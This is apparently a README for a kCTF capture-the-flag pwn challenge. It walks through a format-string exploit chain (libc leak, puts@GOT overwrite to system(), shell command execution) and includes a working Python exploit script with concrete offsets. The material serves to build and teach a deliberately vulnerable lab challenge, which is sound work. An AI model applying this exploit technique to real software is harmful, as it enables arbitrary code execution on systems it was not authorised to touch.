# Spec Ops — kCTF Execution Guide
# Category: Pwn — Format String → Arbitrary Read/Write → GOT Hijack → RCE
# Same execution pattern as open-sesame-kctf / postcard-kctf (kCTF pwn
# template: raw TCP, nsjail `ONCE` mode, socat + kctf_pow).

## Vulnerability

**Category:** Pwn — classic format-string bug (`printf(buf)` instead of `printf("%s", buf)`)
**Flag:** `CTF{sp3c_0ps_fmt_str_g0t_hij4ck_5h3ll}` (no flag was given in the
spec for this one, so I picked one in the same style as the others —
swap it for whatever your CTF platform wants before deploying)

`field_report()` reads the operator's report straight into `printf()` as
the *format* argument. `printf` has no idea the string came from the
network — it just does what format strings tell it to do:

- `%p` reads whatever is in the next register/stack slot `printf` would
  normally treat as an argument, and prints it as a pointer. Since we
  supply *no* real arguments, those slots are just leftover values —
  including, at a specific position, a genuine return address sitting
  inside libc.
- `%n` (by way of `%hn`, the 16-bit variant) writes the number of
  characters printed *so far* to whatever address is in the
  corresponding argument slot. If we control both that address and how
  many characters got printed before it, we control what gets written
  there.

## The chain, concretely

The terminal takes two field reports before it debriefs — that's
deliberate, so there's room to leak on the first one and write on the
second:

1. **Leak** (`field report #1`): send `%27$p`. Argument slot 27 happens
   to land on a return address left on the stack by an earlier internal
   libc stdio call (the trace runs through `_IO_file_overflow`'s call to
   `_IO_do_write`). That return address is always exactly
   `libc_base + 0x92ef3` for this build, so subtracting the constant
   recovers `libc_base` — and from there, `system()`'s real address
   (`libc_base + 0x58750`).
2. **Overwrite** (`field report #2`): `puts()`'s GOT entry lives at a
   *fixed, non-randomized* address (`0x404008`) because the binary is
   compiled `-no-pie` — no leak needed for that part, `readelf -r chal`
   just tells you. Using the classic multi-write `%hn` technique (three
   16-bit writes covering the 48 significant bits of a canonical
   address), we overwrite `puts@GOT` with `system()`'s real address.
3. **Trigger** (`closing message`): the very next thing the program does
   is `puts(note)`. Since `puts`'s GOT entry now points at `system()`,
   and `puts`/`system` share the exact same calling convention (one
   pointer argument, in `RDI`), that call silently becomes
   `system(note)` — and `note` is whatever we just typed. Full command
   execution.

### A deliberate, documented deviation from the spec's wording

The spec's diagram narrates this as overwriting **`exit()`'s** GOT entry
and then "the program calls `exit(\"/bin/sh\")`". I built it against
**`puts()`'s** GOT entry instead, and here's why: `exit()` is declared
`void exit(int status)`. Even if you write source code that (buggily)
passes a pointer to `exit()`, the compiler still moves only the
low 32 bits into `EDI` for the call — writing to the 32-bit register
`EDI` zeroes the upper 32 bits of `RDI` too. A stack or libc pointer
almost never fits in 32 bits, so by the time the hijacked call actually
runs, the "pointer" it's holding has been silently truncated into
garbage, and `system()` gets called with an invalid address instead of
your string. `puts(char *)` has no such truncation — its whole
parameter *is* the pointer — so it's the version of this technique that
is actually exploitable end to end. Functionally it's the same idea the
spec is gesturing at (leak → compute `system()`'s address → hijack a
GOT entry → get a shell), just aimed at the GOT slot that makes the
final step technically work.

## Verified, not just asserted

I compiled the actual binary in this repo and worked out every number
below empirically rather than trusting a spec diagram:

```
$ gcc -fno-stack-protector -no-pie -O0 -o chal chal.c
$ readelf -r chal | grep -E "puts|exit"
0000000000404008  ...  R_X86_64_JUMP_SLOT  ... puts@GLIBC_2.2.5
0000000000404030  ...  R_X86_64_JUMP_SLOT  ... exit@GLIBC_2.2.5
```

For the leak offset, I ran the binary, sent `%20$p` through `%31$p`,
and cross-checked each value against the live process's own
`/proc/<pid>/maps` to see which ones fell inside libc's mapped range.
`%27$p` did, consistently, across five separate ASLR-randomized runs,
always at exactly `libc_base + 0x92ef3`.

For `system()`'s offset:

```
$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep -w system
0000000000058750 W system@@GLIBC_2.2.5
```

Then I built the full three-write `%hn` payload by hand (no pwntools in
this sandbox — see "What I actually tested" below) and ran it against
the compiled binary end to end: leaked a real libc address, computed
`system()`'s real address from it, overwrote `puts@GOT`, then sent
`cat flag_for_test` as the closing message. The flag content came back
inline in the program's own output, followed by the *other* `puts()`
calls in the program (`"Transmission ends."`, `"Session closed."`) each
failing as shell commands (`sh: 1: Transmission: not found`) — which is
exactly the expected side effect once every `puts()` call in the binary
has become a `system()` call.

**One real bug I hit and fixed along the way:** `puts@GOT + 2` is
`0x40400a` — and `0x0a` is a newline. My first version of `chal.c` read
input with `fgets()`, which stops at the first `\n` it sees. That byte
being *part of a target address*, not something the exploit chooses,
meant `fgets()` was silently truncating the payload mid-write every
time, corrupting the last `%hn` write and segfaulting the process. Real
format-string pwn challenges read input with a raw `read()` for exactly
this reason — arbitrary binary payloads, including embedded `\n`/`\0`
bytes as part of target addresses, need to survive intact. I switched
`chal.c` to `read()` and re-verified the full chain afterward.

## Directory Structure

```
spec-ops-kctf/
├── challenge/
│   ├── chal.c        ← the vulnerable field-terminal
│   ├── Makefile        ← -fno-stack-protector -no-pie (dynamically linked, on purpose)
│   ├── Dockerfile       ← compiles chal.c during the image build
│   ├── nsjail.cfg
│   └── flag
├── healthcheck/
│   ├── healthcheck.py    ← pwntools solve script: leak, fmtstr_payload(), trigger
│   ├── healthcheck_loop.sh
│   ├── healthz_webserver.py
│   └── Dockerfile
├── challenge.yaml
└── README.md
```

## What I actually tested (no Docker/kCTF, no pwntools, in this sandbox)

This sandbox has gcc/objdump/readelf/nm/python3 but no Docker daemon and
no pwntools (the package index here is restricted). So I compiled the
real binary and drove the real exploit against it with plain Python +
`/proc/<pid>/{maps,mem}`, hand-rolling the `%hn` payload builder that
`healthcheck.py` replaces with pwntools' `fmtstr_payload()` (same
technique, same output shape — pwntools just automates the padding math
and argument-index bookkeeping):

```bash
cd challenge
gcc -fno-stack-protector -no-pie -O0 -o chal chal.c
echo 'CTF{sp3c_0ps_fmt_str_g0t_hij4ck_5h3ll}' > flag_for_test

python3 - <<'EOF'
import subprocess, struct, time, os

GOT_PUTS = 0x404008
LEAK_IDX, LEAK_OFFSET, SYSTEM_OFFSET, BASE_IDX = 27, 0x92ef3, 0x58750, 8

def build_write_payload(pairs):
    for K in range(4, 16):
        idxs = [BASE_IDX + K + i for i in range(len(pairs))]
        order = sorted(range(len(pairs)), key=lambda i: pairs[i][1])
        parts, cum = [], 0
        for oi in order:
            val = pairs[oi][1]; pad = (val - cum) % 65536
            parts.append(f"%{pad}c%{idxs[oi]}$hn" if pad else f"%{idxs[oi]}$hn")
            cum = (cum + pad) % 65536
        d = "".join(parts)
        if len(d) > K * 8: continue
        full = d + "X" * (K * 8 - len(d))
        return full.encode() + b"".join(struct.pack("<Q", a) for a, _ in pairs)

p = subprocess.Popen(["./chal"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
os.set_blocking(p.stdout.fileno(), False); time.sleep(0.1)
p.stdin.write(f"%{LEAK_IDX}$p\n".encode()); p.stdin.flush(); time.sleep(0.15)
leak = int(p.stdout.read().split(b"Enter field report #1: ")[1].split(b"\n")[0], 16)
libc_base = leak - LEAK_OFFSET
system_addr = libc_base + SYSTEM_OFFSET

w = [(GOT_PUTS, system_addr & 0xffff), (GOT_PUTS+2, (system_addr>>16)&0xffff), (GOT_PUTS+4, (system_addr>>32)&0xffff)]
p.stdin.write(build_write_payload(w) + b"\n"); p.stdin.flush(); time.sleep(0.2)
p.stdin.write(b"cat flag_for_test\n"); p.stdin.flush()
out, _ = p.communicate(timeout=5)
print(out.decode(errors="replace")[-300:])
EOF
```

Expected tail of output: `sh: 1: Transmission: not found`, then the
flag content, then `sh: 1: Session: not found` — the flag printing
between two failed shell lookups is exactly what a successful
`system()`-hijack looks like here.

## Re-deriving the constants

`LEAK_TO_BASE_OFFSET` (`0x92ef3`) and `SYSTEM_OFFSET` (`0x58750`) in
`healthcheck/healthcheck.py`, and `GOT_PUTS` (`0x404008`) in both
`healthcheck.py` and this README, are all tied to this exact build —
Ubuntu 24.04 / glibc 2.39 and the source in `challenge/chal.c` exactly
as it stands. If you change the base image, the compiler, or add/remove
code before `field_report()`'s first call, **re-derive all three**:

```bash
# GOT_PUTS -- static, from the binary itself
readelf -r chal | grep puts

# SYSTEM_OFFSET -- static, from the target libc
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep -w system

# LEAK_TO_BASE_OFFSET -- empirical: run the binary, dump %20$p..%40$p,
# compare each value against the live process's own /proc/<pid>/maps to
# see which one falls in libc's mapped range, and how far past libc's
# base it sits. See "What I actually tested" above for the exact script
# shape (swap the printed range and re-run the leak loop from a few
# runs to make sure the offset is ASLR-stable before trusting it).
```

## Wiring into kCTF

Same PHASE 1/2/6 steps as open-sesame-kctf's and postcard-kctf's
READMEs — `kctf chal create spec-ops --template pwn`, copy this repo's
`challenge/` and `healthcheck/` over the scaffold, build/push,
`kubectl apply -f challenge.yaml`.

## Common Mistakes

| Mistake | Fix |
|---------|-----|
| Reading the format-string input with `fgets()`/`scanf()` | Both stop at the first `\n`; a real GOT-overwrite payload's raw address bytes will contain `\n`/`\0` bytes some of the time (they did here — `puts@GOT + 2` is `0x40400a`). Use a raw `read()` |
| Targeting `exit()`'s GOT entry literally | `exit(int)` truncates a 64-bit pointer argument to 32 bits before the call — the hijack "works" (GOT write succeeds) but the argument you wanted to pass through is garbage by the time `system()` receives it. Target a GOT entry whose function takes a bare pointer (`puts`, `printf`, `strlen`, ...) instead |
| Compiling with PIE | Defeats the "no leak needed to find the GOT" half of the technique — GOT addresses become randomized right along with everything else |
| Getting the argument index for your own buffer wrong after editing `chal.c` | It's not a fixed constant — it depends on exactly what's between the vulnerable `printf()` call and the start of `main()`. Re-probe it with a plain marker (`"AAAAAAAA" + "%N$p"` for a range of `N`, looking for `0x4141414141414141`) any time the source changes |
| UID mismatch between Dockerfile and nsjail.cfg | Both must use UID 1000 |
